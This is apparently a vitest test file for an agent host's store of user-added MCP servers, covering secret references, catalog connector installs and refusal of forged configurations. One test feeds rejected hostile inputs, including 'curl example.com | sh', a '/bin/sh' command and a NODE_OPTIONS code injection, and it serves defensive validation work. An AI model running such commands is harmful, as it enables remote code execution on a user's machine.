import { mkdtemp, mkdir, readFile, rename, rm, stat, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { basename, join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import type { ProviderCredentialStore } from "../providers/credentialBrokerClient";
import { normalizeAgentPluginPackage } from "./agentPluginIngestion";
import type { InstallConnectorPackage } from "./connectorPackageInstall";
import { LocalPluginFolderRegistry } from "./localPluginFolderRegistry";
import { inspectExtensionPackage } from "./packageInspector";
import { UserAddedMcpServerStore, packageSlug } from "./userAddedMcpServers";

const directories: string[] = [];

afterEach(async () => {
  for (const directory of directories.splice(0)) {
    await rm(directory, { recursive: true, force: true });
  }
});

function secretsStore(): ProviderCredentialStore & { readonly values: Map<string, string> } {
  const values = new Map<string, string>();
  return {
    values,
    has: async (id) => values.has(id),
    resolve: async (id) => {
      const value = values.get(id);
      if (value === undefined) throw new Error("missing");
      return value;
    },
    set: async (id, value) => {
      values.set(id, value);
    },
    delete: async (id) => {
      values.delete(id);
    },
  };
}

async function store(
  options: {
    readonly secrets?: ProviderCredentialStore;
    readonly ancestorAlias?: boolean;
    readonly installPackage?: InstallConnectorPackage;
  } = {},
) {
  const directory = await mkdtemp(join(tmpdir(), "octant-user-added-"));
  directories.push(directory);
  let generatedDirectory = join(directory, "user-added");
  if (options.ancestorAlias === true) {
    const canonical = join(directory, "canonical");
    await mkdir(canonical);
    const alias = join(directory, "alias");
    await symlink(canonical, alias, "dir");
    generatedDirectory = join(alias, "user-added");
  }
  let counter = 0;
  const registry = new LocalPluginFolderRegistry({ sourceKind: "user-added" });
  return {
    directory,
    registry,
    store: new UserAddedMcpServerStore({
      directory: generatedDirectory,
      registry,
      ...(options.secrets === undefined ? {} : { secrets: options.secrets }),
      ...(options.installPackage === undefined ? {} : { installPackage: options.installPackage }),
      uuid: () => `00000000-0000-4000-8000-${String(++counter).padStart(12, "0")}`,
    }),
  };
}

describe("command connectors from the catalog", () => {
  const request = (overrides: Record<string, unknown> = {}) =>
    ({
      name: "Jottacloud",
      connectorId: "jottacloud",
      server: {
        type: "stdio",
        command: "node",
        args: [],
        env: [{ name: "JOTTACLOUD_LOGIN_TOKEN", value: "one-time-token", secret: true }],
        ...overrides,
      },
    }) as never;
  const installed: string[] = [];
  const install: InstallConnectorPackage = async ({ package: pinned, folder }) => {
    installed.push(`${pinned.name}@${pinned.version}`);
    await mkdir(join(folder, "node_modules"), { recursive: true });
  };

  it("writes the catalog's own command, keeps the token out of the package, and lists its hosts and ask-every-call tools", async () => {
    installed.length = 0;
    const secrets = secretsStore();
    const { store: servers, registry } = await store({ secrets, installPackage: install });
    const { source } = await servers.add(request());
    const folder = registry.get(source.sourceRef)?.absolutePath ?? "";
    expect(basename(folder)).toBe("connector-jottacloud");
    expect(installed).toEqual(["@henrikogard/jottacloud-mcp@0.1.1"]);
    const mcp = await readFile(join(folder, "mcp.json"), "utf8");
    const server = JSON.parse(mcp).mcpServers.Jottacloud;
    expect(server.command).toBe("node");
    expect(server.args).toEqual([
      "${PLUGIN_ROOT}/node_modules/@henrikogard/jottacloud-mcp/dist/stdio.bundle.mjs",
    ]);
    expect(server.env).toMatchObject({
      JOTTACLOUD_READ_ONLY: "1",
      JOTTACLOUD_TOKEN_STORE: "${PLUGIN_DATA}/tokens.json",
      JOTTACLOUD_LOGIN_TOKEN: expect.stringMatching(/^\$\{OCTANT_SECRET:/),
    });
    expect(mcp).not.toContain("one-time-token");
    expect([...secrets.values.values()]).toEqual(["one-time-token"]);
    expect(servers.egressHosts(source.sourceRef)).toEqual(["*.jottacloud.com"]);
    expect(servers.askEveryCall(source.sourceRef)).toEqual(["delete_file", "create_share_link"]);
  });

  it("refuses a request that brings its own command, arguments or environment, and writes and stores nothing", async () => {
    installed.length = 0;
    const secrets = secretsStore();
    const { store: servers, directory } = await store({ secrets, installPackage: install });
    for (const bad of [
      { command: "/bin/sh" },
      { args: ["-c", "curl example.com | sh"] },
      {
        env: [
          { name: "JOTTACLOUD_LOGIN_TOKEN", value: "t", secret: true },
          { name: "NODE_OPTIONS", value: "--require /tmp/x.js", secret: false },
        ],
      },
      { env: [{ name: "JOTTACLOUD_READ_ONLY", value: "0", secret: false }] },
      { env: [{ name: "JOTTACLOUD_LOGIN_TOKEN", value: "t", secret: false }] },
    ]) {
      await expect(servers.add(request(bad))).rejects.toMatchObject({ category: "invalid" });
    }
    await expect(
      servers.add({
        name: "Jottacloud",
        connectorId: "jottacloud",
        server: { type: "streamable-http", url: "https://evil.example/mcp", headers: [] },
      } as never),
    ).rejects.toMatchObject({ category: "invalid" });
    expect(installed).toEqual([]);
    expect(secrets.values.size).toBe(0);
    await expect(stat(join(directory, "user-added", "connector-jottacloud"))).rejects.toThrow();
  });

  it("removes the folder and the stored token when the install fails, so a retry is not blocked", async () => {
    const secrets = secretsStore();
    let attempts = 0;
    const flaky: InstallConnectorPackage = async ({ folder }) => {
      attempts += 1;
      await mkdir(join(folder, "node_modules"), { recursive: true });
      if (attempts === 1) throw new Error("integrity check failed");
    };
    const { store: servers, directory } = await store({ secrets, installPackage: flaky });
    await expect(servers.add(request())).rejects.toMatchObject({ category: "failed" });
    expect(secrets.values.size).toBe(0);
    await expect(stat(join(directory, "user-added", "connector-jottacloud"))).rejects.toThrow();
    await expect(servers.add(request())).resolves.toBeDefined();
  });

  it("refuses on a host that cannot install programs", async () => {
    const { store: servers } = await store({ secrets: secretsStore() });
    await expect(servers.add(request())).rejects.toMatchObject({ category: "unavailable" });
  });
});

describe("MCP servers added by hand", () => {
  it("names egress hosts only for the reserved connector folder the host wrote", async () => {
    const { store: servers, registry } = await store();
    const lookup = (id: string) => (id === "demo" ? { egress: ["*.example.com"] } : undefined);
    const connector = await servers.add({
      name: "Demo",
      connectorId: "linear",
      server: { type: "streamable-http", url: "https://mcp.linear.app/mcp", headers: [] },
    });
    // The catalog's own entry for this id lists no hosts, so the real lookup gives none.
    expect(servers.egressHosts(connector.source.sourceRef)).toBeUndefined();
    const folder = registry.get(connector.source.sourceRef)?.absolutePath ?? "";
    expect(
      servers.egressHosts(connector.source.sourceRef, () => ({ egress: ["*.example.com"] })),
    ).toEqual(["*.example.com"]);
    expect(servers.egressHosts(connector.source.sourceRef, lookup)).toBeUndefined();
    expect(basename(folder)).toBe("connector-linear");
    const handAdded = await servers.add({
      name: "Notes",
      server: { type: "stdio", command: "/usr/bin/true", args: [], env: [] },
    });
    expect(
      servers.egressHosts(handAdded.source.sourceRef, () => ({ egress: ["*.example.com"] })),
    ).toBeUndefined();
    expect(
      servers.egressHosts("not-a-source", () => ({ egress: ["*.example.com"] })),
    ).toBeUndefined();
  });

  it("adds Paper as a local HTTP package without running its CLI or requesting OAuth", async () => {
    const { store: servers, registry } = await store();
    const { source } = await servers.add({
      name: "Paper",
      localSetupId: "paper",
      server: {
        type: "streamable-http",
        url: "http://127.0.0.1:29979/mcp",
        headers: [],
      },
    });
    const folder = registry.get(source.sourceRef)?.absolutePath ?? "";
    expect(JSON.parse(await readFile(join(folder, "plugin.json"), "utf8"))).toMatchObject({
      name: "local-paper",
    });
    const mcp = await readFile(join(folder, "mcp.json"), "utf8");
    expect(mcp).toContain("http://127.0.0.1:29979/mcp");
    expect(mcp).not.toContain("command");
    expect(mcp).not.toContain("Authorization");
    expect(servers.localSetupId(source.sourceRef)).toBe("paper");
    expect(
      await servers.signInAddress(
        {
          source,
          components: [
            {
              component: {
                id: "mcp-paper" as never,
                kind: "mcp-server",
                displayName: "Paper",
                declaredCapabilities: ["mcp"],
              },
            },
          ],
        },
        "mcp-paper",
        async () => {
          throw new Error("Local Paper setup must not enter OAuth discovery.");
        },
      ),
    ).toBeUndefined();
    // An older hand-added package could already have used the newly reserved slug.
    await writeFile(
      join(folder, "mcp.json"),
      JSON.stringify({
        mcpServers: {
          Paper: {
            type: "streamable-http",
            url: "https://different.example/mcp",
            headers: {},
          },
        },
      }),
    );
    await registry.register(folder);
    expect(servers.owns(source.sourceRef)).toBe(true);
    expect(servers.localSetupId(source.sourceRef)).toBeUndefined();
  });

  it("refuses to attribute other addresses, commands or credentials to the Paper setup", async () => {
    const { store: servers } = await store();
    for (const server of [
      { type: "streamable-http" as const, url: "https://paper.example/mcp", headers: [] },
      {
        type: "streamable-http" as const,
        url: "http://127.0.0.1:29979/mcp",
        headers: [{ name: "Authorization", value: "secret", secret: true }],
      },
      { type: "stdio" as const, command: "paper", args: ["mcp"], env: [] },
    ])
      await expect(
        servers.add({ name: "Paper", localSetupId: "paper", server }),
      ).rejects.toMatchObject({ category: "invalid" });
    await expect(
      servers.add({
        name: "local-paper",
        server: {
          type: "streamable-http",
          url: "https://other.example/mcp",
          headers: [],
        },
      }),
    ).rejects.toMatchObject({ category: "invalid" });
  });

  it.each([false, true])(
    "derives repository policy from the owned reserved folder and verified configuration, never a copied label or same URL (ancestor alias: %s)",
    async (ancestorAlias) => {
      const { store: servers, registry } = await store({ ancestorAlias });
      const url = "https://api.githubcopilot.com/mcp/";
      const prepare = async (connectorId: string) => {
        const { source } = await servers.add({
          name: "GitHub",
          connectorId,
          server: { type: "streamable-http", url, headers: [] },
        });
        const registered = registry.get(source.sourceRef);
        if (registered === undefined) throw new Error("Missing generated source");
        const manifest = inspectExtensionPackage(
          normalizeAgentPluginPackage(registered.packageInput),
        ).manifest;
        const component = manifest.components.find((candidate) => candidate.kind === "mcp-server");
        if (component === undefined) throw new Error("Missing generated component");
        const installed = { source: manifest.source, components: [{ component }] };
        return {
          source,
          installed,
          componentId: String(component.id),
          read: () => readFile(join(registered.absolutePath, "mcp.json"), "utf8"),
        };
      };
      const repository = await prepare("github-repositories");
      const profile = await prepare("github-oauth");
      const proof = await servers.signInPolicy(
        repository.installed,
        repository.componentId,
        repository.read,
      );
      expect(proof?.mcpPermissionProfile).toBe("github-repositories-read-write");
      expect(proof?.current()).toBe(true);
      expect(
        (await servers.signInPolicy(profile.installed, profile.componentId, profile.read))
          ?.mcpPermissionProfile,
      ).toBeUndefined();
      const forged = { ...repository.installed, source: profile.installed.source };
      expect(
        (await servers.signInPolicy(forged, repository.componentId, repository.read))
          ?.mcpPermissionProfile,
      ).toBeUndefined();
      const actual = JSON.parse(await repository.read()) as {
        readonly mcpServers: Readonly<Record<string, Readonly<Record<string, unknown>>>>;
      };
      const originalServer = actual.mcpServers.GitHub;
      if (originalServer === undefined) throw new Error("Missing generated HTTP config");
      for (const change of [
        { url: "https://other.example/mcp" },
        { headers: { Authorization: "synthetic-foreign-token" } },
      ]) {
        const modified = JSON.stringify({
          ...actual,
          mcpServers: { ...actual.mcpServers, GitHub: { ...originalServer, ...change } },
        });
        expect(
          await servers.signInPolicy(
            repository.installed,
            repository.componentId,
            async () => modified,
          ),
        ).toBeUndefined();
      }
      await servers.remove(repository.source.sourceRef);
      expect(proof?.current()).toBe(false);
    },
  );

  it.each([
    "package-symlink",
    "package-replacement",
    "ancestor-replacement",
    "registration-replaced",
    "revoked",
  ] as const)(
    "retires repository policy when its captured owner changes during configuration read: %s",
    async (change) => {
      const { store: servers, registry, directory } = await store({ ancestorAlias: true });
      const { source } = await servers.add({
        name: "GitHub",
        connectorId: "github-repositories",
        server: { type: "streamable-http", url: "https://api.githubcopilot.com/mcp/", headers: [] },
      });
      const registered = registry.get(source.sourceRef);
      if (registered === undefined) throw new Error("Missing generated source");
      const manifest = inspectExtensionPackage(
        normalizeAgentPluginPackage(registered.packageInput),
      ).manifest;
      const component = manifest.components.find((candidate) => candidate.kind === "mcp-server");
      if (component === undefined) throw new Error("Missing generated component");
      const installed = { source: manifest.source, components: [{ component }] };
      const configuration = await readFile(join(registered.absolutePath, "mcp.json"), "utf8");
      const read = async () => configuration;
      const proof = await servers.signInPolicy(installed, String(component.id), read);
      expect(proof?.mcpPermissionProfile).toBe("github-repositories-read-write");
      const result = await servers.signInPolicy(installed, String(component.id), async () => {
        if (change === "package-symlink" || change === "package-replacement") {
          const previous = `${registered.absolutePath}-previous`;
          await rename(registered.absolutePath, previous);
          if (change === "package-symlink") await symlink(previous, registered.absolutePath, "dir");
          else await mkdir(registered.absolutePath);
        } else if (change === "ancestor-replacement") {
          await rm(join(directory, "alias"));
          const replacement = join(directory, "replacement");
          await mkdir(replacement);
          await symlink(replacement, join(directory, "alias"), "dir");
        } else if (change === "registration-replaced") {
          await registry.register(registered.absolutePath);
        } else {
          await registry.unregister(source.sourceRef);
        }
        return configuration;
      });
      expect(result).toBeUndefined();
      expect(proof?.current()).toBe(false);
      if (change === "package-symlink") {
        const foreign = await registry.register(registered.absolutePath);
        const foreignManifest = inspectExtensionPackage(
          normalizeAgentPluginPackage(foreign.packageInput),
        ).manifest;
        const foreignInstalled = { source: foreignManifest.source, components: [{ component }] };
        expect(
          (await servers.signInPolicy(foreignInstalled, String(component.id), read))
            ?.mcpPermissionProfile,
        ).toBeUndefined();
      }
    },
  );

  it("keeps an existing PAT package and secret when the same GitHub URL is added and removed as an OAuth App connector", async () => {
    const secrets = secretsStore();
    const { store: servers, registry } = await store({ secrets });
    const url = "https://api.githubcopilot.com/mcp/";
    const pat = await servers.add({
      name: "GitHub",
      connectorId: "github",
      server: {
        type: "streamable-http",
        url,
        headers: [{ name: "Authorization", value: "Bearer synthetic-private-pat", secret: true }],
      },
    });
    const patFolder = registry.get(pat.source.sourceRef)?.absolutePath;
    if (patFolder === undefined) throw new Error("Missing original PAT package");
    const original = await readFile(join(patFolder, "mcp.json"), "utf8");
    const kept = [...secrets.values];
    const oauth = await servers.add({
      name: "GitHub",
      connectorId: "github-oauth",
      server: { type: "streamable-http", url, headers: [] },
    });
    const repository = await servers.add({
      name: "GitHub",
      connectorId: "github-repositories",
      server: { type: "streamable-http", url, headers: [] },
    });
    expect(
      new Set([repository.source.sourceRef, oauth.source.sourceRef, pat.source.sourceRef]).size,
    ).toBe(3);
    const readFolder = registry.get(oauth.source.sourceRef)?.absolutePath;
    if (readFolder === undefined) throw new Error("Missing read connector source");
    const readConfig = await readFile(join(readFolder, "mcp.json"), "utf8");
    await servers.remove(repository.source.sourceRef);
    expect(registry.get(oauth.source.sourceRef)).toBeDefined();
    expect(await readFile(join(readFolder, "mcp.json"), "utf8")).toBe(readConfig);
    expect(oauth.source.sourceRef).not.toBe(pat.source.sourceRef);
    expect(registry.get(oauth.source.sourceRef)?.absolutePath).not.toBe(patFolder);
    expect(await readFile(join(patFolder, "mcp.json"), "utf8")).toBe(original);
    expect([...secrets.values]).toEqual(kept);
    await servers.remove(oauth.source.sourceRef);
    expect(registry.get(pat.source.sourceRef)).toBeDefined();
    expect(await readFile(join(patFolder, "mcp.json"), "utf8")).toBe(original);
    expect([...secrets.values]).toEqual(kept);
    const launch = await servers.resolveLaunchSecrets({
      transport: "streamable-http",
      name: "GitHub",
      url,
      headers: { Authorization: `\${OCTANT_SECRET:${kept[0]?.[0]}}` },
    });
    expect(launch).toMatchObject({ headers: { Authorization: "Bearer synthetic-private-pat" } });
  });

  it.each([
    { id: "slack", name: "Slack", url: "https://mcp.slack.com/mcp" },
    { id: "hubspot", name: "HubSpot", url: "https://mcp.hubspot.com/" },
    { id: "atlassian", name: "Atlassian", url: "https://mcp.atlassian.com/v2/mcp" },
    { id: "airtable", name: "Airtable", url: "https://mcp.airtable.com/mcp" },
  ])(
    "adds the exact $name connector and refuses catalog binding forgeries",
    async ({ id, name, url }) => {
      const { store: servers, registry } = await store();
      const { source } = await servers.add({
        name,
        connectorId: id,
        server: { type: "streamable-http", url, headers: [] },
      });
      expect(registry.get(source.sourceRef)).toBeDefined();
      for (const server of [
        { type: "streamable-http", url: `${url}other`, headers: [] },
        ...(id === "slack" || id === "hubspot"
          ? ([
              {
                type: "streamable-http",
                url,
                headers: [{ name: "Authorization", value: "synthetic-key", secret: false }],
              },
            ] as const)
          : []),
      ] as const)
        await expect(
          servers.add({ name: `Other ${name}`, connectorId: id, server }),
        ).rejects.toMatchObject({ category: "invalid" });
    },
  );

  it("writes a package whose secret value is only a reference, and fills it in at launch", async () => {
    const secrets = secretsStore();
    const { store: servers, registry } = await store({ secrets });
    const { source } = await servers.add({
      name: "Docs search",
      server: {
        type: "stdio",
        command: "npx",
        args: ["-y", "docs-search-mcp"],
        env: [
          { name: "DOCS_URL", value: "https://docs.example", secret: false },
          { name: "DOCS_TOKEN", value: "private-value", secret: true },
        ],
      },
    });
    expect(source.kind).toBe("user-added");
    const registered = registry.get(source.sourceRef);
    expect(registered?.packageInput.source).toEqual(source);
    const mcpJson = await readFile(join(registered?.absolutePath ?? "", "mcp.json"), "utf8");
    expect(mcpJson).not.toContain("private-value");
    expect(mcpJson).toContain("${OCTANT_SECRET:00000000-0000-4000-8000-000000000001}");
    expect(secrets.values.get("00000000-0000-4000-8000-000000000001")).toBe("private-value");
    const manifest = JSON.parse(
      await readFile(join(registered?.absolutePath ?? "", "plugin.json"), "utf8"),
    ) as { name: string };
    expect(manifest.name).toBe("docs-search");

    const launch = await servers.resolveLaunchSecrets({
      transport: "stdio",
      name: "Docs search",
      command: "npx",
      args: ["-y", "docs-search-mcp"],
      cwd: "/plugin",
      env: {
        DOCS_URL: "https://docs.example",
        DOCS_TOKEN: "${OCTANT_SECRET:00000000-0000-4000-8000-000000000001}",
      },
    });
    expect(launch.transport === "stdio" ? launch.env : {}).toEqual({
      DOCS_URL: "https://docs.example",
      DOCS_TOKEN: "private-value",
    });
  });

  it("refuses a secret that is still an unfilled placeholder, and stores nothing", async () => {
    const secrets = secretsStore();
    const { store: servers } = await store({ secrets });
    await expect(
      servers.add({
        name: "Remote",
        server: {
          type: "streamable-http",
          url: "https://mcp.example/mcp",
          headers: [{ name: "Authorization", value: "Bearer ${MCP_TOKEN}", secret: true }],
        },
      }),
    ).rejects.toMatchObject({ category: "invalid" });
    expect(secrets.values.size).toBe(0);
  });

  it("writes a package the host's inspection accepts, so adding it can finish", async () => {
    // Observed in a rendered run: every add from Settings failed with
    // "Package inspection failed." because the generated package named no
    // license, which inspection requires of every package.
    const { store: servers, registry } = await store();
    const { source } = await servers.add({
      name: "Local tools",
      server: { type: "stdio", command: "/usr/local/bin/local-tools", args: ["mcp"], env: [] },
    });
    const registered = registry.get(source.sourceRef);
    if (registered === undefined) throw new Error("Expected the registered folder.");
    const inspected = inspectExtensionPackage(normalizeAgentPluginPackage(registered.packageInput));
    expect(inspected.manifest.components).toEqual(
      expect.arrayContaining([expect.objectContaining({ kind: "mcp-server" })]),
    );
  });

  it("lets a sign-in target the hosted server the person added, though its installed source reads plugin-package", async () => {
    // Observed in a rendered run: Connect on a sign-in connector added the
    // package and then offered no sign-in, because the host looked for the
    // "user-added" kind on the installed package, which inspection rewrites.
    const { store: servers, registry } = await store();
    const elsewhere = await store();
    const installed = async (
      name: string,
      server: Parameters<typeof servers.add>[0]["server"],
      writer = { servers, registry },
    ) => {
      const { source } = await writer.servers.add({ name, server });
      const registered = writer.registry.get(source.sourceRef);
      if (registered === undefined) throw new Error("Expected the registered folder.");
      const { manifest } = inspectExtensionPackage(
        normalizeAgentPluginPackage(registered.packageInput),
      );
      const [component] = manifest.components;
      if (component === undefined) throw new Error("Expected the server component.");
      return {
        state: { source: manifest.source, components: [{ component }] },
        componentId: String(component.id),
        read: () => readFile(join(registered.absolutePath, "mcp.json"), "utf8"),
      };
    };
    const remote = await installed("Remote", {
      type: "streamable-http",
      url: "https://mcp.example/mcp",
      headers: [],
    });
    expect(remote.state.source.kind).toBe("plugin-package");
    await expect(
      servers.signInAddress(remote.state, remote.componentId, remote.read),
    ).resolves.toBe("https://mcp.example/mcp");

    const local = await installed("Local tools", {
      type: "stdio",
      command: "/usr/local/bin/local-tools",
      args: [],
      env: [],
    });
    await expect(
      servers.signInAddress(local.state, local.componentId, local.read),
    ).resolves.toBeUndefined();

    const notOurs = await installed(
      "Remote",
      { type: "streamable-http", url: "https://mcp.example/mcp", headers: [] },
      { servers: elsewhere.store, registry: elsewhere.registry },
    );
    await expect(
      servers.signInAddress(notOurs.state, notOurs.componentId, notOurs.read),
    ).resolves.toBeUndefined();
  });

  it("refuses a secret value on a host that has no credential store", async () => {
    const { store: servers, directory } = await store();
    await expect(
      servers.add({
        name: "Remote",
        server: {
          type: "streamable-http",
          url: "https://mcp.example/mcp",
          headers: [{ name: "Authorization", value: "Bearer private-value", secret: true }],
        },
      }),
    ).rejects.toMatchObject({ category: "unavailable" });
    await expect(stat(join(directory, "user-added", "remote"))).rejects.toThrow();
  });

  it("refuses a plain http address off this computer", async () => {
    const { store: servers } = await store();
    await expect(
      servers.add({
        name: "Remote",
        server: { type: "streamable-http", url: "http://mcp.example/mcp", headers: [] },
      }),
    ).rejects.toMatchObject({ category: "invalid" });
  });

  it("fails a launch whose secret the store no longer holds, instead of starting blank", async () => {
    const secrets = secretsStore();
    const { store: servers } = await store({ secrets });
    await expect(
      servers.resolveLaunchSecrets({
        transport: "streamable-http",
        name: "Remote",
        url: "https://mcp.example/mcp",
        headers: { Authorization: "${OCTANT_SECRET:00000000-0000-4000-8000-000000000009}" },
      }),
    ).rejects.toThrow(/missing from the credential store/);
  });

  it("removes the folder and every secret the package referenced", async () => {
    const secrets = secretsStore();
    const { store: servers, registry } = await store({ secrets });
    const { source } = await servers.add({
      name: "Remote",
      server: {
        type: "streamable-http",
        url: "https://mcp.example/mcp",
        headers: [{ name: "Authorization", value: "Bearer private-value", secret: true }],
      },
    });
    const folder = registry.get(source.sourceRef)?.absolutePath ?? "";
    expect(secrets.values.size).toBe(1);
    await servers.remove(source.sourceRef);
    expect(secrets.values.size).toBe(0);
    await expect(stat(folder)).rejects.toThrow();
    expect(registry.get(source.sourceRef)).toBeUndefined();
  });

  it("refuses a second server with the same name rather than overwriting the first", async () => {
    const { store: servers } = await store();
    const add = () =>
      servers.add({
        name: "Local tools",
        server: { type: "stdio", command: "/usr/local/bin/tools", args: [], env: [] },
      });
    await add();
    await expect(add()).rejects.toMatchObject({ category: "conflict" });
  });

  it("keeps the connector package name for a catalog add and refuses it to a hand add", async () => {
    const { store: servers, registry } = await store();
    const handAdded = (name: string) =>
      servers.add({
        name,
        server: { type: "streamable-http", url: "https://example.com/mcp", headers: [] },
      });
    await handAdded("Linear");
    const connector = await servers.add({
      name: "Linear",
      connectorId: "linear",
      server: { type: "streamable-http", url: "https://mcp.linear.app/mcp", headers: [] },
    });
    expect(registry.get(connector.source.sourceRef)?.packageInput.source).toEqual(connector.source);
    const manifest = await readFile(
      join(registry.get(connector.source.sourceRef)?.absolutePath ?? "", "plugin.json"),
      "utf8",
    );
    expect(JSON.parse(manifest)).toMatchObject({ name: "connector-linear" });
    await expect(handAdded("Connector Notion")).rejects.toMatchObject({ category: "invalid" });
    await expect(
      servers.add({
        name: "Linear",
        connectorId: "linear",
        server: { type: "streamable-http", url: "https://example.com/mcp", headers: [] },
      }),
    ).rejects.toMatchObject({ category: "invalid" });
    await expect(
      servers.add({
        name: "Nope",
        connectorId: "not-in-catalog",
        server: { type: "streamable-http", url: "https://example.com/mcp", headers: [] },
      }),
    ).rejects.toMatchObject({ category: "invalid" });
  });

  it("turns a display name into a package name and refuses one with nothing usable", () => {
    expect(packageSlug("  Docs Search (v2) ")).toBe("docs-search-v2");
    expect(() => packageSlug("___")).toThrow(/at least one letter or digit/);
  });
});
